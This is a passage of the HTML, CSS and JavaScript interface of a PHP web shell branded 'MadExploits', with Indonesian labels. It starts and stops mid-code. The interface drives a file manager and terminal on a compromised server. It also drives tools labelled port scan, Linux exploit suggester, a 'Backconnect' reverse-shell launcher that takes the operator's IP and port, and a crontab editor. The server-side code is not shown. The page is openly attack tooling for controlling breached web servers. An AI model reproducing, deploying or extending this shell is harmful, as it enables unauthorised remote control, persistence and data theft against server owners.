            color: var(--gh-dark-text);
            text-decoration: none;
            font-weight: 600;
        }

        .file-name a:hover {
            color: var(--gh-orange-accent);
            text-decoration: none;
        }

        .action-dropdown .dropdown-toggle::after {
            display: none;
        }

        .action-dropdown .btn {
            background: none;
            border: none;
            color: var(--gh-dark-text-secondary);
        }

        .action-dropdown .btn:hover,
        .action-dropdown .btn:focus {
            background-color: rgba(139, 148, 158, 0.2);
            color: var(--gh-dark-text);
        }

        .dropdown-menu {
            --bs-dropdown-bg: #161b22;
            --bs-dropdown-border-color: var(--gh-dark-border);
            --bs-dropdown-link-color: var(--gh-dark-text);
            --bs-dropdown-link-hover-bg: rgba(139, 148, 158, 0.1);
            --bs-dropdown-link-hover-color: var(--gh-orange-accent);
        }

        .btn-primary {
            --bs-btn-bg: var(--gh-orange-accent);
            --bs-btn-border-color: var(--gh-orange-accent);
            --bs-btn-hover-bg: var(--gh-orange-accent-hover);
            --bs-btn-hover-border-color: var(--gh-orange-accent-hover);
            --bs-btn-color: #0d1117;
            --bs-btn-hover-color: #0d1117;
        }

        .btn-info {
            --bs-btn-bg: var(--gh-blue-icon);
            --bs-btn-border-color: var(--gh-blue-icon);
            --bs-btn-hover-bg: #78baff;
            --bs-btn-hover-border-color: #78baff;
            --bs-btn-color: #0d1117;
            --bs-btn-hover-color: #0d1117;
        }

        .modal-content {
            background-color: var(--gh-dark-component-bg);
            border-color: var(--gh-dark-border);
        }

        .modal-header,
        .modal-footer {
            border-bottom-color: var(--gh-dark-border);
            border-top-color: var(--gh-dark-border);
        }

        .form-control,
        .form-select {
            background-color: var(--gh-dark-bg);
            color: var(--gh-dark-text);
            border-color: var(--gh-dark-border);
        }

        .form-control:focus,
        .form-select:focus {
            background-color: var(--gh-dark-bg);
            color: var(--gh-dark-text);
            border-color: var(--gh-orange-accent);
            box-shadow: 0 0 0 0.25rem rgba(247, 129, 102, 0.25);
        }

        #editor {
            width: 100%;
            height: 60vh;
            border-radius: 6px;
        }

        .server-info-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
            padding: 1rem 1.5rem;
            background-color: var(--gh-dark-component-bg);
            border: 1px solid var(--gh-dark-border);
            border-radius: 6px;
            margin-bottom: 1rem;
        }

        .fm-logo {
            font-size: 1.5rem;
            font-weight: 300;
            font-family: "Caveat", cursive;
            color: var(--gh-dark-text);
            text-decoration: none;
        }

        .fm-logo i {
            color: var(--gh-orange-accent);
        }

        .fm-logo strong {
            font-weight: 700;
        }

        .server-stats {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            gap: 1.5rem;
            flex-wrap: wrap;
        }

        .server-stats li {
            font-size: 0.9rem;
            color: var(--gh-dark-text-secondary);
        }

        .server-stats .badge {
            font-size: 0.85rem;
            font-weight: 600;
            padding: 0.4em 0.7em;
        }

        .fm-logo-wrapper {
            display: flex;
            align-items: center;
            gap: 1rem;
        }

        .refresh-btn {
            color: var(--gh-dark-text-secondary);
            font-size: 1.2rem;
            text-decoration: none;
            transition: transform 0.5s ease;
        }

        .refresh-btn:hover {
            color: var(--gh-orange-accent);
            transform: rotate(180deg);
        }

        .disk-usage {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .progress {
            --bs-progress-bg: #010409;
            --bs-progress-bar-color: var(--gh-dark-bg);
            --bs-progress-font-size: 0.75rem;
            border: 1px solid var(--gh-dark-border);
            width: 120px;
        }

        .terminal-container {
            background-color: var(--gh-dark-component-bg);
            border: 1px solid var(--gh-dark-border);
            border-radius: 6px;
            padding: 1rem;
            display: flex;
            flex-direction: column;
        }

        .terminal-container h5 {
            border-bottom: 1px solid var(--gh-dark-border);
            padding-bottom: 0.75rem;
            margin-bottom: 1rem;
            font-weight: 600;
        }

        #terminal {
            height: 100%;
            width: 100%;
        }

        .fab-container {
            position: fixed;
            bottom: 30px;
            right: 30px;
            z-index: 1050;
            display: flex;
            flex-direction: column-reverse;
            align-items: center;
        }

        .fab-main-button {
            width: 60px;
            height: 60px;
            background-color: transparent;
            border: none;
            border-radius: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--gh-orange-accent);
            font-size: 24px;
            cursor: grab;
            box-shadow: none;
            transition: all 0.3s ease;
        }

        .fab-main-button:hover {
            background-color: rgba(247, 129, 102, 0.1);
        }

        .fab-main-button:active {
            cursor: grabbing;
        }

        .fab-main-button .fas {
            transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
        }

        .fab-container.active .fab-main-button .fas {
            transform: rotate(135deg);
        }

        .fab-menu {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 15px;
            pointer-events: none;
        }

        .fab-container.active .fab-menu {
            pointer-events: auto;
        }

        .fab-item {
            width: 48px;
            height: 48px;
            background-color: transparent;
            border: none;
            border-radius: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--gh-dark-text-secondary);
            font-size: 20px;
            cursor: pointer;
            margin-bottom: 10px;
            box-shadow: none;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            position: relative;
            opacity: 0;
            transform: translateY(20px);
        }

        .fab-container.active .fab-item {
            opacity: 1;
            transform: translateY(0);
        }

        .fab-container.active .fab-item:nth-child(1) {
            transition-delay: 0.1s;
        }

        .fab-container.active .fab-item:nth-child(2) {
            transition-delay: 0.2s;
        }

        .fab-container.active .fab-item:nth-child(3) {
            transition-delay: 0.3s;
        }

        .fab-item:hover {
            background-color: rgba(139, 148, 158, 0.1);
            color: var(--gh-orange-accent);
        }

        .fab-item::after {
            content: attr(data-tooltip);
            position: absolute;
            right: 100%;
            margin-right: 15px;
            background-color: #161b22;
            color: #c9d1d9;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 14px;
            white-space: nowrap;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s, visibility 0.3s;
        }

        .fab-item:hover::after {
            opacity: 1;
            visibility: visible;
        }

        .copyright {
            text-align: center;
            font-size: 14px;
            color: #777;
            padding: 15px 0;
            border-top: 1px solid var(--gh-dark-border);
            margin-top: 20px;
        }

        .copyright a {
            color: var(--gh-dark-text-secondary);
            text-decoration: none;
            font-weight: 500;
        }

        .copyright a:hover {
            color: var(--gh-orange-accent);
            text-decoration: underline;
        }

        #bulkActions {
            border: 1px dashed var(--gh-dark-border);
            background: rgba(139, 148, 158, 0.08);
        }

        #contextMenu {
            position: absolute;
            display: none;
            z-index: 2000;
            min-width: 220px;
            border-radius: 6px;
            overflow: hidden;
        }

        .row-context-active td {
            background-color: rgba(88, 166, 255, 0.08) !important;
        }

        /* SweetAlert2 Dark Theme Customization */
        .swal2-popup {
            background-color: var(--gh-dark-component-bg) !important;
            color: var(--gh-dark-text) !important;
            border: 1px solid var(--gh-dark-border) !important;
        }

        .swal2-title {
            color: var(--gh-dark-text) !important;
        }

        .swal2-html-container {
            color: var(--gh-dark-text-secondary) !important;
        }

        .swal2-confirm,
        .swal2-confirm:focus {
            background-color: var(--gh-orange-accent) !important;
            color: #0d1117 !important;
            box-shadow: none !important;
        }

        .swal2-confirm.btn-info {
            background-color: var(--gh-blue-icon) !important;
        }

        .swal2-cancel,
        .swal2-cancel:focus {
            background-color: #21262d !important;
            box-shadow: none !important;
        }

        .swal2-loader {
            border-color: var(--gh-orange-accent) transparent var(--gh-orange-accent) transparent !important;
        }

        .right-sidebar-wrapper {
            display: flex;
            flex-direction: column;
            gap: 1rem;
            min-height: 0;
            /* Mencegah overflow pada child flexbox */
        }

        .terminal-container {
            flex-grow: 1;
            min-height: 0;
        }

        .tools-container {
            background-color: var(--gh-dark-component-bg);
            border: 1px solid var(--gh-dark-border);
            border-radius: 6px;
            padding: 1rem;
            flex-shrink: 0;
        }

        .tools-container h5 {
            border-bottom: 1px solid var(--gh-dark-border);
            padding-bottom: 0.75rem;
            margin-bottom: 1rem;
            font-weight: 600;
        }

        .tools-body {
            display: flex;
            flex-wrap: wrap;
            gap: 0.5rem;
        }

        .tools-body .btn {
            color: var(--gh-dark-text-secondary);
        }

        .tools-body .btn:hover {
            color: var(--gh-orange-accent);
            border-color: var(--gh-orange-accent);
            background-color: rgba(247, 129, 102, 0.1);
        }

        .tool-output {
            background-color: var(--gh-dark-bg);
            border: 1px solid var(--gh-dark-border);
            padding: 1rem;
            border-radius: 5px;
            max-height: 400px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.9em;
        }

        .tool-output dt {
            color: var(--gh-orange-accent);
            font-weight: bold;
        }

        .tool-output dd {
            margin-left: 1rem;
            margin-bottom: 0.5rem;
            color: var(--gh-dark-text);
            white-space: pre-wrap;
        }

        .btn-mad {
            background-color: #1f242c;
            border-bottom: 1px solid #30363d;
        }
    </style>
</head>

<body>
    <input type="file" id="fileUploadInput" multiple style="display: none;" />

    <div class="container-fluid mt-3">
        <header class="server-info-header">
            <div class="fm-logo-wrapper">
                <a href="#" class="fm-logo">
                    <strong>~> MadExploits</strong>
                </a>
                <a href="#" id="refreshBtn" class="refresh-btn" title="Refresh Stats"><i class="fas fa-sync-alt"></i></a>
            </div>
            <ul class="server-stats mb-0">
                <li>
                    <div id="disk-usage" class="disk-usage" title="Loading...">
                        <span><i class="fa-solid fa-hard-drive"></i></span>
                        <div class="progress" role="progressbar">
                            <div id="disk-progress-bar" class="progress-bar" style="width: 0%"></div>
                        </div>
                    </div>
                </li>
                <li><span id="stat-user" class="badge bg-info text-dark">...</span></li>
                <li><span id="stat-php" class="badge" style="background-color: #7A86B8; color: #fff;">...</span></li>
                <li><span id="stat-server" class="badge bg-dark">...</span></li>
            </ul>
        </header>

        <div class="main-layout">
            <div class="file-manager-container">
                <div class="fm-header">
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                        </ol>
                    </nav>
                    <div>
                        <button class="btn btn-sm btn-secondary" id="goToRootBtn"><i class="fas fa-home me-1"></i> Ke Root</button>
                        <button class="btn btn-sm btn-secondary" id="createDirBtn"><i class="fas fa-folder-plus me-1"></i> Buat Direktori</button>
                        <button class="btn btn-sm btn-primary" id="createFileBtn"><i class="fas fa-file-medical me-1"></i> Buat File</button>
                    </div>
                </div>

                <div id="bulkActions" class="alert alert-dark d-none mt-2 mx-3">
                    <span id="selectedCount">0</span> item dipilih
                    <div class="float-end">
                        <button class="btn btn-sm btn-danger" id="bulkDelete"><i class="fas fa-trash me-1"></i> Hapus</button>
                        <button class="btn btn-sm btn-primary" id="bulkDownload"><i class="fas fa-download me-1"></i> Download</button>
                        <button class="btn btn-sm btn-secondary" id="bulkChmod"><i class="fas fa-key me-1"></i> Permissions</button>
                    </div>
                </div>

                <div class="table-responsive">
                    <table id="fileManagerTable" class="table table-hover" style="width:100%">
                        <thead>
                            <tr>
                                <th style="width: 30px;"><input type="checkbox" id="selectAll" /></th>
                                <th style="width: 40px;" class="no-sort"><i class="fas fa-grip-horizontal"></i></th>
                                <th>Nama</th>
                                <th>Ukuran</th>
                                <th>Terakhir Diubah</th>
                                <th class="text-end no-sort">Aksi</th>
                            </tr>
                        </thead>
                        <tbody>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="right-sidebar-wrapper">
                <div class="terminal-container">
                    <h5><i class="fas fa-terminal me-2"></i>Terminal</h5>
                    <div id="terminal"></div>
                </div>

                <div class="tools-container">
                    <h5><i class="fas fa-toolbox me-2"></i>Tools</h5>
                    <div class="tools-body">
                        <a href="?action=adminer" target="_blank" class="btn btn-mad">
                            <i class="fas fa-database me-1"></i> ADMINER
                        </a>
                        <button class="btn btn-mad" id="portScanBtn">
                            <i class="fas fa-search-location me-1"></i> PORT SCAN
                        </button>
                        <button class="btn btn-mad" id="linuxExploitBtn">
                            <i class="fa-brands fa-linux"></i> LINUX EXPLOIT
                        </button>
                        <button class="btn btn-mad" id="backconnectBtn">
                            <i class="fa-solid fa-network-wired"></i> BACKCONNECT
                        </button>
                        <button class="btn btn-mad" id="cronManagerBtn">
                            <i class="fa-solid fa-server"></i> CRON MANAGER
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="cronManagerModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Cron Job Manager</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-3">
                        <label for="cronJobsTextarea" class="form-label">Current Crontab</label>
                        <textarea class="form-control" id="cronJobsTextarea" rows="10" style="font-family: monospace;"></textarea>
                        <small class="form-text text-muted">Edit the jobs below. Each line represents one job. Removing all lines will clear the crontab.</small>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="saveCronBtn">Save Crontab</button>
                </div>
            </div>
        </div>
    </div>



    <div class="modal fade" id="formModal" tabindex="-1" aria-labelledby="formModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="formModalLabel">Ganti Nama</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <form id="itemForm">
                        <input type="hidden" id="actionType" />
                        <input type="hidden" id="originalName" />
                        <div class="mb-3">
                            <label for="itemName" class="form-label" id="itemNameLabel">Nama Baru</label>
                            <input type="text" class="form-control" id="itemName" required />
                        </div>
                    </form>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
                    <button type="button" class="btn btn-primary" id="saveBtn">Simpan</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="chmodModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Ubah Permissions</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p>Mengubah izin untuk: <strong id="chmodItemName"></strong></p>
                    <form id="chmodForm">
                        <div class="mb-3">
                            <label for="chmodValue" class="form-label">Nilai Oktal (e.g., 0755)</label>
                            <input type="text" class="form-control" id="chmodValue" required />
                        </div>
                    </form>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
                    <button type="button" class="btn btn-primary" id="saveChmodBtn">Simpan Izin</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="bulkChmodModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Ubah Permissions Massal</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p>Mengubah izin untuk <strong id="bulkChmodCount"></strong> item yang dipilih.</p>
                    <div class="mb-3">
                        <label for="bulkChmodValue" class="form-label">Nilai Oktal Baru (e.g., 0755)</label>
                        <input type="text" class="form-control" id="bulkChmodValue" required placeholder="0755" />
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Batal</button>
                    <button type="button" class="btn btn-primary" id="saveBulkChmodBtn">Terapkan ke Semua</button>
                </div>
            </div>
        </div>
    </div>
    <div class="modal fade" id="editorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-xl">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="editorModalLabel">Edit File</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body p-0">
                    <div id="editor"></div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Tutup</button>
                    <button type="button" class="btn btn-primary" id="saveEditorBtn">Simpan Perubahan</button>
                </div>
            </div>
        </div>
    </div>

    <div class="fab-container">
        <div class="fab-main-button">
            <i class="fas fa-tools"></i>
        </div>
        <div class="fab-menu">
            <div class="fab-item" data-tooltip="Create File" id="fabCreateFile">
                <i class="fas fa-file-alt"></i>
            </div>
            <div class="fab-item" data-tooltip="Create Directory" id="fabCreateDir">
                <i class="fas fa-folder"></i>
            </div>
            <div class="fab-item" data-tooltip="Upload File" id="fabUploadFile">
                <i class="fas fa-upload"></i>
            </div>
        </div>
    </div>

    <ul id="contextMenu" class="dropdown-menu">
        <li><a class="dropdown-item ctx-edit" href="#"><i class="fas fa-edit me-2"></i>Edit</a></li>
        <li><a class="dropdown-item ctx-rename" href="#"><i class="fas fa-i-cursor me-2"></i>Ganti Nama</a></li>
        <li><a class="dropdown-item ctx-download" href="#"><i class="fas fa-download me-2"></i>Download</a></li>
        <li>
            <hr class="dropdown-divider" />
        </li>
        <li><a class="dropdown-item ctx-delete" href="#"><i class="fas fa-trash me-2"></i>Hapus</a></li>
    </ul>

    <div class="copyright">
        <span>&copy; Copyright
            <a href="https://github.com/MadExploits" target="_blank" rel="noopener noreferrer">
                github.com/MadExploits
            </a>
        </span>
    </div>

    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.7/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.13.7/js/dataTables.bootstrap5.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.6/ace.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <script>
        $(document).ready(function() {
            const API_URL = ''; // Current file

            // --- SweetAlert Helper Functions ---
            function showSuccess(message) {
                Swal.fire({
                    icon: 'success',
                    title: 'Success',
                    text: message,
                    timer: 2000,
                    showConfirmButton: false
                });
            }

            function showError(message) {
                Swal.fire({
                    icon: 'error',
                    title: 'Oops... An Error Occurred',
                    text: message
                });
            }

            function showLoading(title, text = 'Please wait...') {
                Swal.fire({
                    title: title,
                    text: text,
                    allowOutsideClick: false,
                    didOpen: () => {
                        Swal.showLoading();
                    }
                });
            }

            // --- API Call Helper ---
            function apiCall(action, data = {}, method = 'POST') {
                const options = {
                    url: API_URL,
                    type: method,
                    dataType: 'json',
                    data: {
                        action: action,
                        ...data
                    }
                };

                if (method.toUpperCase() === 'POST' && !(data instanceof FormData)) {
                    options.data = JSON.stringify(data);
                    options.contentType = 'application/json; charset=utf-8';
                    options.url = `?action=${action}`;
                }

                return $.ajax(options);
            }


            const dt = $('#fileManagerTable').DataTable({
                columnDefs: [{
                    orderable: false,
                    targets: [0, 1, 5]
                }],
                order: [],
                language: {
                    search: 'Search:',
                    lengthMenu: 'Show _MENU_ entries',
                    info: 'Showing _START_ to _END_ of _TOTAL_ entries',
                    infoEmpty: 'Showing 0 of 0 entries',
                    infoFiltered: '(filtered from _MAX_ total entries)',
                    zeroRecords: 'No matching records found',
                    paginate: {
                        first: 'First',
                        last: 'Last',
                        next: 'Next',
                        previous: 'Previous'
                    }
                }
            });

            function loadFiles() {
                $.ajax({
                    url: API_URL,
                    type: 'GET',
                    dataType: 'json',
                    data: {
                        action: 'list'
                    },
                    success: function(response) {
                        if (response.success) {
                            updateTable(response.files);
                            updateBreadcrumbs(response);
                        } else {
                            showError(response.message);
                        }
                    },
                    error: function() {
                        showError('Failed to load files. Check console (F12) for details.');
                    }
                }).always(function() {
                    $('#bulkActions').addClass('d-none');
                    $('#selectAll').prop('checked', false);
                });
            }

            function changeDirectory(targetPath) {
                $.ajax({
                    url: API_URL,
                    type: 'POST',
                    dataType: 'json',
                    data: {
                        action: 'chdir',
                        target_path: targetPath
                    },
                    success: function(response) {
                        if (response.success) {
                            updateTable(response.files);
                            updateBreadcrumbs(response);
                        } else {
                            showError('Failed to change directory: ' + response.message);
                        }
                    },
                    error: function() {
                        showError('Failed to change directory. Check console (F12) for details.');
                    }
                });
            }

            function updateTable(files) {
                dt.clear();
                files.forEach(file => {
                    const icon = file.type === 'folder' ?
                        '<i class="fas fa-folder file-icon folder-icon"></i>' :
                        '<i class="fas fa-file-alt file-icon"></i>';

                    const nameLink = file.type === 'folder' ?
                        `<a href="#" class="text-light folder-link" style="text-decoration:none;">${file.name}</a>` :
                        `<a href="#" class="text-light file-link" style="text-decoration:none;">${file.name}</a>`;

                    const actions = `
                        <div class="dropdown action-dropdown">
                            <button class="btn btn-sm dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false">
                                <i class="fas fa-ellipsis-h"></i>
                            </button>
                            <ul class="dropdown-menu dropdown-menu-end">
                                ${file.type === 'file' ? `<li><a class="dropdown-item edit-btn" href="#"><i class="fas fa-edit me-2"></i>Edit</a></li>` : ''}
                                <li><a class="dropdown-item rename-btn" href="#"><i class="fas fa-i-cursor me-2"></i>Rename</a></li>
                                <li><a class="dropdown-item chmod-btn" href="#" data-current-perms="${file.permissions}"><i class="fas fa-key me-2"></i>Permissions</a></li>
                                ${file.type === 'file' ? `<li><a class="dropdown-item download-btn" href="#"><i class="fas fa-download me-2"></i>Download</a></li>` : ''}
                                <li><hr class="dropdown-divider" /></li>
                                <li><a class="dropdown-item delete-btn" href="#"><i class="fas fa-trash-alt me-2"></i>Delete</a></li>
                            </ul>
                        </div>`;

                    const rowNode = dt.row.add([
                        '<input type="checkbox" class="file-checkbox" />',
                        icon,
                        nameLink,
                        file.size,
                        file.last_modified,
                        actions
                    ]).draw(false).node();

                    $(rowNode).addClass('file-row').attr({
                        'data-name': file.name,
                        'data-type': file.type
                    });
                });
            }

            function updateBreadcrumbs(data) {
                const breadcrumbContainer = $('.breadcrumb');
                breadcrumbContainer.empty();

                if (data.drives && data.drives.length > 0) {
                    const drivesContainer = $('<div class="drives-list mb-2"></div>');
                    data.drives.forEach(drive => {
                        const driveLink = $(`<a href="#" class="text-light breadcrumb-link me-3" data-path="${drive.path}" style="text-decoration: none;">${drive.name}</a>`);
                        drivesContainer.append(driveLink);
                    });
                    breadcrumbContainer.append(drivesContainer);
                }

                const breadcrumbPathContainer = $('<ol class="breadcrumb-list p-0 m-0" style="list-style:none; display:flex; flex-wrap: wrap;"></ol>');
                data.breadcrumbs.forEach((crumb, index) => {
                    let crumbItem;
                    if (index === data.breadcrumbs.length - 1) {
                        crumbItem = $(`<li class="breadcrumb-item active" aria-current="page">${crumb.name}</li>`);
                    } else {
                        crumbItem = $(`<li class="breadcrumb-item"><a href="#" class="breadcrumb-link" data-path="${crumb.path}">${crumb.name}</a></li>`);
                    }
                    breadcrumbPathContainer.append(crumbItem);
                });
                breadcrumbContainer.append(breadcrumbPathContainer);
            }

            function handleApiResponse(response) {
                if (response.success) {
                    showSuccess(response.message || 'Operation completed successfully.');
                    loadFiles();
                } else {
                    showError(response.message || 'An unknown error occurred.');
                }
            }

            // --- TOOLS LOGIC ---

            // Port Scanner
            $('#portScanBtn').on('click', async function() {
                const {
                    value: formValues
                } = await Swal.fire({
                    title: 'Port Scanner',
                    html: `
                        <input id="swal-host" class="swal2-input" placeholder="Host (e.g., 127.0.0.1)" value="127.0.0.1">
                        <input id="swal-ports" class="swal2-input" placeholder="Ports (e.g., 80,443,8000-8080)" value="21,22,25,80,443,3306,5432">
                    `,
                    focusConfirm: false,
                    preConfirm: () => {
                        return {
                            host: document.getElementById('swal-host').value,
                            ports: document.getElementById('swal-ports').value
                        }
                    }
                });

                if (formValues && formValues.host) {
                    showLoading('Scanning Ports...', `Scanning ${formValues.host}`);
                    apiCall('port_scan', formValues)
                        .done(function(response) {
                            if (response.success) {
                                let resultHtml = `
                                    <p>Scan complete for <strong>${response.host}</strong>.</p>
                                    <p><strong>Open Ports:</strong></p>
                                `;
                                if (response.open_ports.length > 0) {
                                    resultHtml += `<div class="tool-output">${response.open_ports.join(', ')}</div>`;
                                } else {
                                    resultHtml += `<div class="tool-output">No open ports found from the scanned list.</div>`;
                                }
                                Swal.fire({
                                    title: 'Scan Results',
                                    html: resultHtml,
                                    icon: 'info'
                                });
                            } else {
                                showError(response.message);
                            }
                        })
                        .fail(() => showError('Failed to perform port scan.'));
                }
            });

            // Linux Exploit Suggester
            $('#linuxExploitBtn').on('click', function() {
                showLoading('Gathering System Info...');
                apiCall('linux_exploit_suggester', {})
                    .done(function(response) {
                        if (response.success) {
                            let resultsHtml = '<dl class="text-start">';
                            for (const [key, value] of Object.entries(response.results)) {
                                resultsHtml += `<dt>${key}:</dt><dd>${value || 'N/A or permission denied'}</dd>`;
                            }
                            resultsHtml += '</dl>';
                            Swal.fire({
                                title: 'Linux System Information',
                                html: `<div class="tool-output">${resultsHtml}</div>`,
                                width: '800px'
                            });
                        } else {
                            showError(response.message);
                        }
                    })
                    .fail(() => showError('Failed to run exploit suggester.'));
            });

            // Backconnect
            $('#backconnectBtn').on('click', async function() {
                const {
                    value: formValues
                } = await Swal.fire({
                    title: 'Reverse Shell (Backconnect)',
                    html: `
                        <input id="swal-ip" class="swal2-input" placeholder="Your IP Address">
                        <input id="swal-port" class="swal2-input" placeholder="Your Listening Port">
                    `,
                    focusConfirm: false,
                    confirmButtonText: 'Connect',
                    preConfirm: () => {
                        return {
                            ip: document.getElementById('swal-ip').value,
                            port: document.getElementById('swal-port').value
                        }
                    }
                });

                if (formValues && formValues.ip && formValues.port) {
                    showLoading('Initiating Connection...', `Attempting to connect to ${formValues.ip}:${formValues.port}`);
                    apiCall('backconnect', formValues)
                        .done(response => {
                            if (response.success) {
                                Swal.fire({
                                    icon: 'success',
                                    title: 'Connection Initiated',
                                    text: response.message,
                                    timer: 5000
                                });
                            } else {
                                showError(response.message);
                            }
                        })
                        .fail((xhr, status, error) => {
                            if (status === 'timeout' || xhr.statusText === "timeout") {
                                showSuccess(`Backconnect initiated to ${formValues.ip}:${formValues.port}. The server is now connected to your listener.`);
                            } else {
                                showError('Failed to initiate backconnect. ' + (xhr.responseJSON ? xhr.responseJSON.message : 'Check console for details.'));
                            }
                        });
                }
            });

            // Cron Manager
            const cronModal = new bootstrap.Modal(document.getElementById('cronManagerModal'));
            $('#cronManagerBtn').on('click', function() {
                apiCall('cron_manager', {
                        sub_action: 'list'
                    })
                    .done(response => {
                        if (response.success) {
                            $('#cronJobsTextarea').val(response.cron_jobs);
                            cronModal.show();
                        } else {
                            showError(response.message);
                        }
                    })
                    .fail(() => showError('Could not retrieve crontab.'));
            });

            $('#saveCronBtn').on('click', function() {
                const jobs = $('#cronJobsTextarea').val();
                apiCall('cron_manager', {
                        sub_action: 'save',
                        jobs: jobs
                    })
                    .done(response => {
                        if (response.success) {
                            showSuccess(response.message);
                            cronModal.hide();
                        } else {
                            showError(response.message);
                        }
                    })
                    .fail(() => showError('Failed to save crontab.'));
            });


            // --- INITIALIZE MODALS & EDITOR ---
            const formModal = new bootstrap.Modal(document.getElementById('formModal'));
            const chmodModal = new bootstrap.Modal(document.getElementById('chmodModal'));
            const editorModal = new bootstrap.Modal(document.getElementById('editorModal'));
            const bulkChmodModal = new bootstrap.Modal(document.getElementById('bulkChmodModal'));

            const editor = ace.edit('editor');
            editor.setTheme('ace/theme/tomorrow_night_eighties');
            editor.session.setMode('ace/mode/php');

            function updateHeaderStats() {
                $('#refreshBtn i').addClass('fa-spin');
                $.getJSON('?action=get_stats', function(data) {
                        $('#stat-user').text(data.user);
                        $('#stat-php').text(data.php_version);
                        $('#stat-server').text(data.server_software);

                        const disk = data.disk;
                        const diskProgressBar = $('#disk-progress-bar');
                        diskProgressBar.css('width', disk.percent + '%').text(disk.percent + '%');
                        $('#disk-usage').attr('title', `${disk.used}GB / ${disk.total}GB`);

                        diskProgressBar.removeClass('bg-success bg-warning bg-danger');
                        if (disk.percent >= 90) diskProgressBar.addClass('bg-danger');
                        else if (disk.percent >= 70) diskProgressBar.addClass('bg-warning');
                        else diskProgressBar.addClass('bg-success');
                    })
                    .fail(function() {
                        console.error('Could not fetch header stats.');
                        $('#stat-user').text('Error');
                    })
                    .always(function() {
                        setTimeout(() => $('#refreshBtn i').removeClass('fa-spin'), 500);
                    });
            }

            const tableBody = $('#fileManagerTable tbody');

            $('#refreshBtn').on('click', function(e) {
                e.preventDefault();
                loadFiles();
                updateHeaderStats();
            });
            $('#goToRootBtn').on('click', function(e) {
                e.preventDefault();
                changeDirectory('');
            });
            tableBody.on('click', '.folder-link', function(e) {
                e.preventDefault();
                const name = $(this).closest('.file-row').data('name');
                changeDirectory(name);
            });
            tableBody.on('click', '.file-link', function(e) {
                e.preventDefault();
                const name = $(this).closest('.file-row').data('name');
                editFile(name);
            });
            $('.breadcrumb').on('click', '.breadcrumb-link', function(e) {
                e.preventDefault();
                const path = $(this).data('path');
                changeDirectory(path);
            });
            tableBody.on('click', '.rename-btn', function(e) {
                e.preventDefault();
                e.stopPropagation();
                const originalName = $(this).closest('.file-row').data('name');
                $('#actionType').val('rename');
                $('#originalName').val(originalName);
                $('#itemName').val(originalName);
                $('#formModalLabel').text('Rename');
                $('#itemNameLabel').text('New Name');
                formModal.show();
            });

            tableBody.on('click', '.delete-btn', function(e) {
                e.preventDefault();
                e.stopPropagation();
                const itemNameToDelete = $(this).closest('.file-row').data('name');

                Swal.fire({
                    title: 'Are you sure?',
                    text: `You are about to delete "${itemNameToDelete}". This cannot be undone!`,
                    icon: 'warning',
                    showCancelButton: true,
                    confirmButtonColor: '#f78166',
                    cancelButtonColor: '#30363d',
                    confirmButtonText: 'Yes, delete it!',
                    cancelButtonText: 'Cancel'
